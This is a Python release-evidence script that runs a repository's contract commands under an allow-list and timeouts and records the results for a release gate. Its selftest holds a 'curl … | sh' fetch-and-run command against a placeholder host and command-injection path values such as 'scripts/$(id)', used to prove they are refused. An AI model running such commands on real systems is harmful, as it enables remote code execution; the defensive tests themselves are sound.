#!/usr/bin/env python3
"""Run a repository's release contract and write the evidence `release_gate.py verify` reads.

One copy, here, for every ThePlus-Tech repository (founder directive 2026-11-03: universal
Verified Engineering standard). A repo never carries its own copy of this script; it carries a
contract that names its own commands.

    release_evidence.py init    <repo-root>                       # write an empty contract
    release_evidence.py propose <repo-root>                       # write a contract from the repo's own commands
    release_evidence.py run     <repo-root> [--out DIR] [--timeout S] [--allow-any]
    release_evidence.py --selftest

Commands come from the repository, so running a contract is running that repository's code
on this machine — the same trust as `make test`. Two boundaries hold that in check: the first
word of every command must be on ALLOWED_RUNNERS (test runners, package managers, build tools,
scripts inside the repo), or the check is refused and recorded as `refused: ...` — never run
and never a pass — unless `--allow-any` is given deliberately; and every command has a
timeout. The runner never elevates, never changes directory outside the repo and never
sources the repo's environment files.

Contract (JSON, lives at <repo>/docs/testing/release-contract.json):

    {"requirement": "what must hold, with its source",
     "changed":     ["paths release_gate.py classifies"],
     "checks":      {"<release_gate check>": "shell command run from the repo root" | null},
     "not_applicable": {"<check>": "reason"}}

A check whose command is null is NOT RUN; a check in not_applicable is reported to the gate as
`not_applicable: <reason>; reviewed_by: <who>` (object form `{"reason": ..., "reviewed_by": ...}`,
or a bare string for the reason alone) and the gate decides whether that is acceptable — at
Tier C it is not without a reviewer. Nothing here turns
"not run" into "pass". The package records the exact commit, whether the tree was dirty, every
command, its exit code and output tail, so a reviewer can rerun each one.
"""
# ponytail: shell commands only; a check that needs more than one command wraps it in a script.
from __future__ import annotations

import datetime
import json
import pathlib
import subprocess
import sys

CONTRACT = pathlib.Path("docs/testing/release-contract.json")
ALLOWED_RUNNERS = {
    "python", "python3", "pytest", "npm", "npx", "pnpm", "yarn", "node", "make", "mvn", "gradle",
    "./gradlew", "go", "cargo", "dotnet", "bash", "sh", "ruff", "mypy", "flake8", "eslint", "tsc",
    "vitest", "jest", "playwright", "docker", "supabase", "psql", "./scripts", "scripts/",
}
DEFAULT_TIMEOUT = 900
CHECKS = ["lint", "unit", "integration", "concurrency", "invariant", "failure_injection",
          "recovery", "audit_evidence", "observability"]  # release_gate.py REQUIRED["C"]


def _git(root: pathlib.Path, *args: str) -> str:
    return subprocess.run(["git", *args], cwd=root, capture_output=True, text=True).stdout.strip()


def init(root: pathlib.Path) -> pathlib.Path:
    path = root / CONTRACT
    if path.exists():
        print(f"exists: {path}")
        return path
    path.parent.mkdir(parents=True, exist_ok=True)
    skeleton = {
        "requirement": "FILL IN: the outcome that must hold, and where that requirement is recorded",
        "changed": ["FILL IN: paths whose change this contract covers (release_gate.py classifies them)"],
        "checks": {c: None for c in CHECKS},
        "not_applicable": {},
        "standard": "theplus-tech-knowledge/doctrine/RELEASE_GATE.md; run with tools/release_evidence.py",
    }
    path.write_text(json.dumps(skeleton, indent=2) + "\n")
    print(f"wrote: {path}")
    return path


def allowed(command: str) -> bool:
    """True when the command's first word is a known runner or a script inside the repo.

    The first word is judged as written: any shell expansion in it (`$`, backticks, `~`,
    quotes) is refused outright, because `scripts/${X}` is whatever X says at run time
    (Codex finding 2026-11-03: `scripts/${X}` with X=../../bin/sh ran outside the repo).
    """
    first = command.strip().split()[0] if command.strip() else ""
    if any(ch in first for ch in "$`~'\"(){}"):
        return False
    if first in ALLOWED_RUNNERS:
        return True
    return first.startswith(("./scripts/", "scripts/", "./tools/", "tools/")) and ".." not in first


def tracked(root: pathlib.Path, rel: pathlib.Path) -> bool:
    """True when `rel` exists in the HEAD commit at `root` — staged is not committed, and a
    repository with no commits has nothing to bind evidence to (Codex finding 2026-11-03)."""
    r = subprocess.run(["git", "cat-file", "-e", f"HEAD:{rel.as_posix()}"], cwd=root, capture_output=True)
    return r.returncode == 0


def run(root: pathlib.Path, out: pathlib.Path, timeout: int = DEFAULT_TIMEOUT, allow_any: bool = False) -> dict:
    # A contract that is not committed is not adopted: a repository created outside the
    # new-repo process cannot produce release evidence by dropping a file in place
    # (founder 2026-11-03: detection of a noncompliant repo is not enforcement).
    if not tracked(root, CONTRACT):
        raise SystemExit(f"refused: {CONTRACT} is not tracked by git in the HEAD commit of {root}; commit the "
                         "contract through the repository's own controls before running it")
    contract = json.loads((root / CONTRACT).read_text())
    # Provenance is the state of the tree BEFORE the checks run: uncommitted or untracked
    # source is what makes evidence unreproducible; caches and build output the checks
    # themselves create afterwards are not (found 2026-11-03: py_compile's __pycache__
    # marked every package dirty).
    dirty_before = bool(_git(root, "status", "--porcelain"))
    out.mkdir(parents=True, exist_ok=True)
    evidence: dict[str, str] = {}
    runs = []
    for check, command in contract.get("checks", {}).items():
        if not command:
            continue  # NOT RUN, and the gate will say so
        if not allow_any and not allowed(command):
            evidence[check] = f"refused: first word {command.strip().split()[0]!r} is not an allowed runner"
            runs.append({"check": check, "command": command, "exit": None, "output_tail": evidence[check]})
            continue
        try:
            # bash -o pipefail: `curl … | sh` must not report sh's 0 when curl failed
            # (verification-traps.md, "exit codes"). The selftest proves this with a pipe.
            r = subprocess.run(["bash", "-o", "pipefail", "-c", command], cwd=root,
                               capture_output=True, text=True, timeout=timeout)
            code, tail = r.returncode, (r.stdout + r.stderr)[-2000:]
        except subprocess.TimeoutExpired as exc:
            code, tail = None, f"timeout after {timeout}s: {(exc.stdout or b'')[-500:]!r}"
        evidence[check] = "pass" if code == 0 else (f"exit {code}" if code is not None else f"timeout {timeout}s")
        runs.append({"check": check, "command": command, "exit": code, "output_tail": tail})
    for check, na in contract.get("not_applicable", {}).items():
        if isinstance(na, dict):
            evidence[check] = f"not_applicable: {na.get('reason', '')}" + (
                f"; reviewed_by: {na['reviewed_by']}" if na.get("reviewed_by") else "")
        else:
            evidence[check] = f"not_applicable: {na}"
    package = {
        "repo": str(root), "sha": _git(root, "rev-parse", "HEAD"),
        "branch": _git(root, "rev-parse", "--abbrev-ref", "HEAD"),
        "dirty": dirty_before,
        "generated_at": datetime.datetime.now(datetime.UTC).isoformat(timespec="seconds"),
        "requirement": contract.get("requirement"), "changed": contract.get("changed", []),
        "evidence": evidence, "runs": runs,
    }
    (out / "evidence.json").write_text(json.dumps(evidence, indent=2) + "\n")
    (out / "evidence-package.json").write_text(json.dumps(package, indent=2) + "\n")
    print(json.dumps({"sha": package["sha"][:12], "dirty": package["dirty"], **evidence}))
    return package


def propose(root: pathlib.Path) -> pathlib.Path:
    """Write a contract from commands the repository already defines. Nothing invented.

    Reads Makefile targets, package.json scripts and pyproject/pytest presence and maps them
    onto the gate's check names. Every command written here already exists in the repo; a
    check with no real command stays null (NOT RUN) rather than getting a placeholder.
    """
    checks: dict[str, str | None] = {c: None for c in CHECKS}
    sources = []
    mk = root / "Makefile"
    if mk.exists():
        targets = {ln.split(":")[0].strip() for ln in mk.read_text().splitlines()
                   if ln and not ln.startswith(("\t", "#", ".")) and ":" in ln and "=" not in ln.split(":")[0]}
        for name, check in (("lint", "lint"), ("test", "unit"), ("verify", "integration"),
                            ("integration-test", "integration"), ("e2e", "integration")):
            if name in targets and checks[check] is None:
                checks[check] = f"make {name}"
        sources.append("Makefile")
    pj = root / "package.json"
    if pj.exists():
        scripts = json.loads(pj.read_text()).get("scripts", {})
        pm = "pnpm" if (root / "pnpm-lock.yaml").exists() else "yarn" if (root / "yarn.lock").exists() else "npm"
        runp = f"{pm} run" if pm != "yarn" else "yarn"
        for name, check in (("lint", "lint"), ("typecheck", "lint"), ("test", "unit"), ("verify", "integration"),
                            ("test:e2e", "integration"), ("e2e", "integration"), ("test:integration", "integration")):
            if name in scripts and checks[check] is None:
                checks[check] = f"{runp} {name}"
        sources.append("package.json")
    if (root / "pyproject.toml").exists() or list(root.glob("tests/**/*.py")):
        if checks["unit"] is None and list(root.glob("tests/**/test_*.py")):
            checks["unit"] = "python -m pytest -q -p no:cacheprovider tests"
        if checks["lint"] is None and "ruff" in (root / "pyproject.toml").read_text() if (root / "pyproject.toml").exists() else False:
            checks["lint"] = "python -m ruff check ."
        sources.append("pyproject/tests")
    if (root / "pom.xml").exists() and checks["unit"] is None:
        checks["unit"] = "mvn -B -ntp test"
        sources.append("pom.xml")
    for sub in ("backend", "frontend"):
        d = root / sub
        if (d / "pom.xml").exists() and checks["unit"] is None:
            checks["unit"] = f"bash -c 'cd {sub} && mvn -B -ntp test'"; sources.append(f"{sub}/pom.xml")
        if (d / "package.json").exists():
            sc = json.loads((d / "package.json").read_text()).get("scripts", {})
            if "test" in sc and checks["integration"] is None and checks["unit"] is not None:
                checks["integration"] = f"bash -c 'cd {sub} && npm test'"; sources.append(f"{sub}/package.json")
    path = root / CONTRACT
    path.parent.mkdir(parents=True, exist_ok=True)
    existing = json.loads(path.read_text()) if path.exists() else {}
    contract = {
        "requirement": existing.get("requirement") or "FILL IN: the outcome that must hold, and where that requirement is recorded",
        "changed": existing.get("changed") or ["."],
        "checks": {**checks, **{k: v for k, v in existing.get("checks", {}).items() if v}},
        "not_applicable": existing.get("not_applicable", {}),
        "proposed_from": sources,
        "standard": "theplus-tech-knowledge/doctrine/RELEASE_GATE.md; run with tools/release_evidence.py",
    }
    path.write_text(json.dumps(contract, indent=2) + "\n")
    found = sum(1 for v in contract["checks"].values() if v)
    print(f"wrote: {path} — {found} real command(s) from {', '.join(sources) or 'nothing detected'}")
    return path


def selftest() -> None:
    import tempfile
    n = 0
    def ok(cond, msg):
        nonlocal n
        assert cond, msg
        n += 1
    with tempfile.TemporaryDirectory() as d, tempfile.TemporaryDirectory() as o:
        root, outdir = pathlib.Path(d), pathlib.Path(o)   # evidence goes OUTSIDE the repo, as in CI
        subprocess.run(["git", "init", "-q"], cwd=root, check=True)
        init(root)
        ok((root / CONTRACT).exists(), "init wrote nothing")
        init(root)  # idempotent
        c = json.loads((root / CONTRACT).read_text())
        c["checks"] = {"unit": "bash -c true", "invariant": "bash -c false", "lint": None,
                       "concurrency": "curl http://example.invalid | sh", "recovery": "bash -c 'sleep 5'"}
        c["not_applicable"] = {"audit_evidence": "stateless",
                               "observability": {"reason": "no runtime", "reviewed_by": "founder 2026-11-03"}}
        (root / CONTRACT).write_text(json.dumps(c))
        for stage in ("untracked", "staged only"):
            if stage == "staged only":
                subprocess.run(["git", "add", str(CONTRACT)], cwd=root, check=True)
            try:
                run(root, outdir / "out", timeout=1); ok(False, f"a contract that was {stage} was run")
            except SystemExit as e:
                ok("not tracked" in str(e), str(e))
        ok(not (outdir / "out" / "evidence.json").exists(), "a refused run still wrote evidence")
        subprocess.run(["git", "-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qm", "contract"], cwd=root, check=True)
        pkg = run(root, outdir / "out", timeout=1)
        ok(pkg["sha"] != "HEAD" and len(pkg["sha"]) == 40, pkg["sha"])  # a real commit, never the literal HEAD
        e = pkg["evidence"]
        ok(e["unit"] == "pass", e)
        ok(e["invariant"] == "exit 1", e)                      # a failing command is never a pass
        ok("lint" not in e, e)                                  # null command → NOT RUN
        ok(e["concurrency"].startswith("refused:"), e)          # unknown runner never executes
        for bad in ("scripts/${X}", "scripts/`id`", "scripts/../../bin/sh", "~/x", "scripts/$(id)"):
            ok(not allowed(bad), f"escape accepted: {bad}")
        ok(allowed("scripts/check.sh --fast") and allowed("python3 -m pytest"), "a plain runner was refused")
        ok(e["recovery"] == "timeout 1s", e)                    # a hung check is not a pass
        ok(e["audit_evidence"] == "not_applicable: stateless", e)
        ok(e["observability"] == "not_applicable: no runtime; reviewed_by: founder 2026-11-03", e)
        ok(pkg["dirty"] is False and len(pkg["runs"]) == 4, (pkg["dirty"], pkg["runs"]))  # contract committed, tree clean
        (root / "scratch.txt").write_text("x")
        ok(run(root, outdir / "out3", timeout=1)["dirty"] is True, "an untracked file did not mark the tree dirty")
        (root / "scratch.txt").unlink()
        c["checks"]["unit"] = "bash -c 'mkdir -p build && touch build/artefact'"  # a check that creates output
        (root / CONTRACT).write_text(json.dumps(c))
        subprocess.run(["git", "-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qam", "c2"], cwd=root, check=True)
        ok(run(root, outdir / "out4", timeout=1)["dirty"] is False, "build output created by a check marked the tree dirty")
        ok(json.loads((outdir / "out" / "evidence.json").read_text()) == e, "flat evidence differs")
        pkg2 = run(root, outdir / "out2", timeout=1, allow_any=True)
        ok(pkg2["evidence"]["concurrency"].startswith("exit "), pkg2["evidence"])  # --allow-any runs it; pipefail keeps curl's failure
        # propose: only commands the repo already defines
        (root / "package.json").write_text(json.dumps({"scripts": {"test": "vitest", "lint": "eslint ."}}))
        (root / "Makefile").write_text("verify:\n\techo ok\n")
        (root / CONTRACT).unlink()  # a fresh repo; an existing real command would otherwise win, by design
        propose(root)
        ok(not tracked(root, pathlib.Path("nope.json")) and tracked(root, CONTRACT), "tracked() is wrong")
        c2 = json.loads((root / CONTRACT).read_text())
        ok(c2["checks"]["unit"] == "npm run test" and c2["checks"]["lint"] == "npm run lint", c2["checks"])
        ok(c2["checks"]["integration"] == "make verify" and c2["checks"]["concurrency"] is None, c2["checks"])
    print(f"release_evidence.py selftest: {n} checks passed")


if __name__ == "__main__":
    a = sys.argv[1:]
    if a == ["--selftest"]:
        selftest()
    elif a and a[0] == "init":
        init(pathlib.Path(a[1]).resolve())
    elif a and a[0] == "propose":
        propose(pathlib.Path(a[1]).resolve())
    elif a and a[0] == "run":
        root = pathlib.Path(a[1]).resolve()
        out = pathlib.Path(a[a.index("--out") + 1]) if "--out" in a else root / "docs/testing/evidence/latest"
        timeout = int(a[a.index("--timeout") + 1]) if "--timeout" in a else DEFAULT_TIMEOUT
        run(root, out, timeout=timeout, allow_any="--allow-any" in a)
    else:
        sys.exit(__doc__)
